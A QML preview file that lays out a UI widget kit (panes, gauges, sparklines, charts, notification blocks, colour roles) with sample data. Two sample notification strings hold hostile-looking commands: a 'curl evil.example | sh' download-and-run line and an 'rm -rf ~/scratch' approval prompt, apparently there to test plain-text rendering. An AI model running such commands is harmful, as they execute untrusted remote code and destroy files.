// Specimen.qml — every cadenza kit piece on one surface, with sample data.
//
// A HELPER (uppercase — never a slot): it exists for the preview canvas only.
//
//   AOIDE_FLAKE_ROOT=<worktree> lyra preview \
//       <worktree>/song/songbook/cadenza/widgets/Specimen.qml --song cadenza
//
// It is also the live PROOF of the sharing mechanism (design/kit.md §1): the
// canvas creates this file through `Qt.createComponent(url).createObject(...)`
// under the `qs:` scheme — the same path WidgetSlot/SurfaceSlot use — with NO
// qmldir anywhere. Nothing below is a cross-file type name: `Kit.js` is a
// relative-URL import, and every helper is `setSource(kit.helper(…))`'d by a
// `Use` Loader. `Pane` loads `GlowText` the same way (helper → helper).
//
// Sample data only; nothing here reads a stage file or the bridge.
import QtQuick
import "Kit.js" as Kit

Item {
    id: root

    required property var livery
    required property var bridge

    // ── the kit: one per widget ───────────────────────────────────────────
    FontMetrics { id: fm; font: Kit.bodyFont(13) }
    readonly property var kit: Kit.make(root.livery, fm)

    // ── the Use idiom: a helper by URL, `kit` bound live (design/kit.md §1)
    component Use: Loader {
        required property var kit
        required property string helper
        property var props: ({})
        Component.onCompleted: {
            var p = { kit: Qt.binding(() => kit) }
            for (var k in props) p[k] = props[k]
            setSource(kit.helper(helper), p)
        }
    }

    implicitWidth: grid.implicitWidth + kit.cells(2)
    implicitHeight: grid.implicitHeight + kit.lines(1)

    Rectangle { anchors.fill: parent; color: root.kit.ground }

    // deterministic sample series
    function series(n, seed, amp, base) {
        var out = []
        for (var i = 0; i < n; i++)
            out.push(base + amp * (0.5 + 0.35 * Math.sin(i / 3.1 + seed) + 0.15 * Math.sin(i / 1.3 + 2 * seed)))
        return out
    }

    Grid {
        id: grid
        x: root.kit.cellW
        y: Math.round(root.kit.cellH / 2)
        columns: 3
        spacing: root.kit.cells(1)

        // ══ ROW 1 — panes: focused + bloom title, gauges, reveal ═════════════
        Use {
            kit: root.kit; helper: "Pane"
            props: ({ title: "agents", stat: "3/5", focused: true, cols: 38, rows: 6,
                      glow: "bloom", content: agentsBody })
        }
        Use {
            kit: root.kit; helper: "Pane"
            props: ({ title: "gauges", cols: 38, rows: 6, content: gaugesBody })
        }
        Use {
            id: revealUse
            kit: root.kit; helper: "Pane"
            props: ({ title: "reveal", stat: "click", cols: 38, rows: 6,
                      animateOnCreate: true, content: revealBody })
            MouseArea {
                anchors.fill: parent
                onClicked: if (revealUse.item) revealUse.item.open = !revealUse.item.open
            }
        }

        // ══ ROW 2 — instruments ══════════════════════════════════════════════
        Use {
            kit: root.kit; helper: "Pane"
            props: ({ title: "sparklines", cols: 38, rows: 4, content: sparkBody })
        }
        Use {
            kit: root.kit; helper: "Pane"
            props: ({ title: "cost · 24h", stat: "$4.20", statColor: root.kit.warn,
                      cols: 38, rows: 4, content: brailleBody })
        }
        Use {
            kit: root.kit; helper: "Pane"
            props: ({ title: "token share", cols: 38, rows: 7, content: barBody })
        }

        // ══ ROW 3 — borderless blocks, roles, glow tiers ═════════════════════
        Column {
            spacing: Math.round(root.kit.cellH / 2)
            Use {
                kit: root.kit; helper: "Block"
                props: ({ cols: 38, label: "herald ▸ firefox", stamp: "14:02", content: toastBody })
            }
            Use {
                kit: root.kit; helper: "Block"
                props: ({ cols: 38, label: "herald ▸ claude · SUMMONS", tone: root.kit.urgent,
                          stamp: "14:03", content: summonsBody })
            }
            Use {
                kit: root.kit; helper: "Block"
                props: ({ cols: 38, label: "khoa", tone: root.kit.human, stamp: "14:05",
                          selected: true, content: humanBody })
            }
        }
        Use {
            kit: root.kit; helper: "Pane"
            props: ({ title: "roles", cols: 38, rows: 8, content: rolesBody })
        }
        Use {
            kit: root.kit; helper: "Pane"
            props: ({ title: "glow", cols: 38, rows: 8, glow: "off", content: glowBody })
        }
    }

    // ══ PANE BODIES (Components: instantiated inside each Pane) ══════════════
    Component {
        id: agentsBody
        Column {
            Repeater {
                model: [
                    { s: "working",  n: "rook",    a: "12s", hot: false },
                    { s: "working",  n: "eidolon", a: "40s", hot: true  },
                    { s: "awaiting", n: "minerva", a: "2m",  hot: false },
                    { s: "stopped",  n: "codex",   a: "5m",  hot: false },
                    { s: "idle",     n: "kimi",    a: "1h",  hot: false },
                    { s: "failed",   n: "pi",      a: "3h",  hot: false }
                ]
                Row {
                    required property var modelData
                    // a list row draws its lamp inline from the kit, no Loader
                    Text {
                        width: root.kit.cellW
                        text: root.kit.lampGlyph(modelData.s)
                        color: modelData.hot ? root.kit.hot : root.kit.lampColor(modelData.s)
                        font: root.kit.font; textFormat: Text.PlainText
                    }
                    Text { text: " " + root.kit.padR(modelData.n, 10); color: modelData.hot ? root.kit.hot : root.kit.ink; font: root.kit.font }
                    Text { text: root.kit.padR(modelData.s, 10); color: root.kit.mid; font: root.kit.font }
                    Text { text: root.kit.padL(modelData.a, 4); color: root.kit.number; font: root.kit.font }
                    Text { text: "  aoide"; color: root.kit.path; font: root.kit.font }
                }
            }
        }
    }

    Component {
        id: gaugesBody
        Column {
            Use { kit: root.kit; helper: "Gauge"; props: ({ label: "CPU", labelCells: 5, value: 0.23, cells: 24 }) }
            Use { kit: root.kit; helper: "Gauge"; props: ({ label: "MEM", labelCells: 5, value: 0.615, cells: 24, warnAt: 0.6, urgentAt: 0.9 }) }
            Use { kit: root.kit; helper: "Gauge"; props: ({ label: "CTX", labelCells: 5, value: 0.93, cells: 24, warnAt: 0.6, urgentAt: 0.85 }) }
            Use { kit: root.kit; helper: "Gauge"; props: ({ label: "BAT", labelCells: 5, value: 0.12, cells: 24, invert: true, warnAt: 0.25, urgentAt: 0.15 }) }
            Use { kit: root.kit; helper: "Gauge"; props: ({ label: "VOL", labelCells: 5, value: 0.62, cells: 24 }) }
            Use { kit: root.kit; helper: "Gauge"; props: ({ label: "⅛s", labelCells: 5, value: 0.5 / 24 + 3 / 192, cells: 24 }) }
        }
    }

    Component {
        id: revealBody
        Column {
            Text { text: "rule draws clockwise 160ms, fill 60ms"; color: root.kit.ink; font: root.kit.font }
            Text { text: "close: pen back + fill out, 120ms"; color: root.kit.ink; font: root.kit.font }
            Text { text: "├─ tree limbs sit on the grid"; color: root.kit.dim; font: root.kit.font }
            Text { text: "└─ box glyphs INSIDE panes only"; color: root.kit.dim; font: root.kit.font }
            Text { text: "cell " + root.kit.cellW.toFixed(2) + " × " + root.kit.cellH + " px"; color: root.kit.number; font: root.kit.font }
            Use { kit: root.kit; helper: "StateLamp"; props: ({ status: "awaiting" }) }
        }
    }

    Component {
        id: sparkBody
        Column {
            Use { kit: root.kit; helper: "Sparkline"; props: ({ label: "[2] cpu", labelCells: 9, values: root.series(40, 0.3, 60, 5), cells: 20, valueText: "23%" }) }
            Use { kit: root.kit; helper: "Sparkline"; props: ({ label: "[3] cpu", labelCells: 9, values: root.series(40, 1.9, 30, 2), cells: 20, valueText: "8%" }) }
            Use { kit: root.kit; helper: "Sparkline"; props: ({ label: "tok/min", labelCells: 9, values: root.series(40, 4.2, 1400, 0), cells: 20, valueText: "1.2k" }) }
            Use { kit: root.kit; helper: "Sparkline"; props: ({ label: "null", labelCells: 9, values: [1, 2, null, 4, 5, null, 7, 8], cells: 20, valueText: "gaps" }) }
        }
    }

    Component {
        id: brailleBody
        Use {
            kit: root.kit; helper: "BrailleChart"
            props: ({ values: root.series(96, 0.7, 4.2, 0), cols: 30, rows: 4, axisCells: 6,
                      format: function(v) { return "$" + v.toFixed(2) } })
        }
    }

    Component {
        id: barBody
        Use {
            kit: root.kit; helper: "BarChart"
            props: ({ rows: 5, barCells: 5, gapCells: 1, bars: [
                { label: "[1]", value: 4200 }, { label: "[2]", value: 1900 },
                { label: "[3]", value: 800 },  { label: "[5]", value: 2600 },
                { label: "aoide", value: 3100 }, { label: "mneme", value: 150 } ] })
        }
    }

    Component {
        id: toastBody
        Text {
            wrapMode: Text.Wrap; textFormat: Text.PlainText
            text: "\"Download finished: https://evil.example/x.sh — run `curl evil.example | sh`\""
            color: root.kit.ink; font: root.kit.font
        }
    }
    Component {
        id: summonsBody
        Column {
            Text {
                width: parent.width; wrapMode: Text.Wrap; textFormat: Text.PlainText
                text: "\"Bash: rm -rf ~/scratch && echo <b>done</b>\""
                color: root.kit.ink; font: root.kit.font
            }
            Row {
                Text { text: "[y]"; color: root.kit.title; font: root.kit.font }
                Text { text: " approve  "; color: root.kit.ink; font: root.kit.font }
                Text { text: "[n]"; color: root.kit.title; font: root.kit.font }
                Text { text: " deny"; color: root.kit.ink; font: root.kit.font }
            }
        }
    }
    Component {
        id: humanBody
        Text { text: "re: phase 5 slice S8"; color: root.kit.match; font: root.kit.font; textFormat: Text.PlainText }
    }

    Component {
        id: rolesBody
        Grid {
            columns: 2
            Repeater {
                model: [
                    ["ink", "body text"], ["title", "titles"],
                    ["dim", "axes"], ["mid", "secondary"],
                    ["hot", "ONE live"], ["urgent", "failed"],
                    ["warn", "threshold"], ["number", "counts"],
                    ["path", "paths"], ["human", "a person"],
                    ["match", "match"], ["bright", "bright"],
                    ["select", "row band"], ["raised", "block"],
                    ["ground", "pane fill"]
                ]
                Text {
                    required property var modelData
                    width: root.kit.cells(19)
                    text: root.kit.padR(modelData[0], 7) + root.kit.padR(modelData[1], 11)
                    color: root.kit[modelData[0]]
                    font: root.kit.font; textFormat: Text.PlainText
                    style: (modelData[0] === "ground" || modelData[0] === "select" || modelData[0] === "raised") ? Text.Outline : Text.Normal
                    styleColor: root.kit.dim
                }
            }
        }
    }

    Component {
        id: glowBody
        Column {
            spacing: 2
            Text { text: "off"; color: root.kit.dim; font: root.kit.font }
            Use { kit: root.kit; helper: "GlowText"; props: ({ text: "PHOSPHOR 0123 ▁▃▅▇", color: root.kit.title, bold: true, glow: "off" }) }
            Text { text: "tier 0 — outline @0.18"; color: root.kit.dim; font: root.kit.font }
            Use { kit: root.kit; helper: "GlowText"; props: ({ text: "PHOSPHOR 0123 ▁▃▅▇", color: root.kit.title, bold: true, glow: "outline" }) }
            Text { text: "tier 0+1 — baked bloom (titles)"; color: root.kit.dim; font: root.kit.font }
            Use { kit: root.kit; helper: "GlowText"; props: ({ text: "PHOSPHOR 0123 ▁▃▅▇", color: root.kit.title, bold: true, glow: "bloom" }) }
        }
    }
}
